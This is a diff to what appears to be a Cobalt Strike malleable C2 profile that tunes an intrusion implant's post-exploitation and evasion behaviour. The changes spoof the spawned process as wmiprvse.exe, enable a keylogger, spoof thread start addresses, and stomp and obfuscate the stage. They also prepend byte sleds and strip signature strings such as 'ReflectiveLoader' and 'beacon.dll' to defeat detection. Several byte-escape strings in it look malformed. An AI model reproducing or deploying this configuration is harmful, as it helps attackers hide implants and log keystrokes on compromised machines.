@@ -23,7 +23,7 @@ set ssh_pipename "SearchTextHarvester##";
 set steal_token_access_mask "11";
 
 ### Proxy Options ###
-set tasks_max_size "3604500";
+set tasks_max_size "1604500";
 #set tasks_proxy_max_size "921600";
 #set tasks_dns_proxy_max_size "71680";
 
@@ -65,16 +65,15 @@ https-certificate {
 #       set timestamp_url "http://timestamp.digicert.com";
 #}
 
-###Post-Ex Block###
+### Post Exploitation Settings ###
 post-ex {
-    set pipename "Winsock2\\CatalogChangeListener-###-0";
     set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
     set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
     set obfuscate "true";
     set smartinject "true";
     set amsi_disable "false";
     set keylogger "GetAsyncKeyState";
-    #set threadhint "module!function+0x##"
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
 }
 
 ### Process Injection ###
@@ -266,12 +265,12 @@ stage {
     set sleep_mask	"true";
     set stomppe	        "true";
     set obfuscate	"true";
-    set rich_header    "\x92\x75\xde\x7f\xf0\x62\x4c\xf0\xc3\x44\x74\x97\x05\xa2\x3d\xd2\x18\xab\x08\xaa\xe9\xcf\x98\x81\x31\x90\x22";
-    
+    set rich_header    "\x92\x75\xde\x7f\xf0\x62\x4c\xf0\xc3\x44\x74\\x90\x97\x05\xa2\x3d\xd2\x18\xab\x08\xaa\xe9\xcf\x98\x81";
+
     set sleep_mask "true";
-    
+
     set smartinject "true";
-    
+
     #set allocator "HeapAlloc";
     set magic_pe "EA";
 
@@ -279,7 +278,7 @@ stage {
     set module_x64 "wwanmm.dll";
 
     transform-x86 {
-        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x87\xd2\x\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
+        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x90\x87\xd2\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
         strrep "This program cannot be run in DOS mode" ""; # Remove this text
         strrep "ReflectiveLoader" "";
         strrep "beacon.dll" "";
@@ -289,7 +288,7 @@ stage {
         }
 
     transform-x64 {
-        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x87\xd2\x\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
+        prepend "\x48\x0f\x1f\x00\x66\x90\x43\x66\x87\xdb\x66\x87\xd2\x40\x45\x49\x41\x87\x90\xd2\x47\x87\xdb\x4c\x0f\x1f\x00\x0f\x1f\x00\x66\x87\xc9\x0f\x1f\x04\x00\x42\x66\x0f\x1f\x04\x00\x90\x87\xc9\x44\x46\x40";
         strrep "This program cannot be run in DOS mode" ""; # Remove this text
         strrep "ReflectiveLoader" "";
         strrep "beacon.x64.dll" "";
@@ -319,4 +318,5 @@ stage {
         strrep "operator" "";
         strrep "operator co_await" "";
         strrep "operator<=>" "";
+    }
 }
